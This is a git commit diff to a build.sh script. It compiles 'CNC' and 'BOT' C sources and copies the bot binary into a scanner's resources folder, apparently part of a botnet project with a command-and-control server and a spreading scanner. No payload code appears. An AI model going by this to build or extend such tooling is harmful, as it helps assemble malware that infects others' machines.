3dbffcbfd3a15420448db78a2c8a26d70aea5d3b
Your Name <you@example.com>
2018-01-17 10:36:33 -0500

    fix merge foireux

--- build.sh
+++ build.sh
@@ -1,2 +1,4 @@
-gcc --std=c99 CNC/*.c -o cnc.bin -Wall -g -DDEBUG  `mysql_config --cflags --libs`;
-gcc --std=c99 BOT/*.c -o bot.bin -Wall -g -DDEBUG;
+gcc CNC/*.c -o cnc.bin -Wall -g -DDEBUG  `mysql_config --cflags --libs`;
+gcc -pthread --std=c99 BOT/*.c -o bot.bin -Wall -g -DDEBUG;
+
+cp ./bot.bin ./scanner/resources/bot2.bin
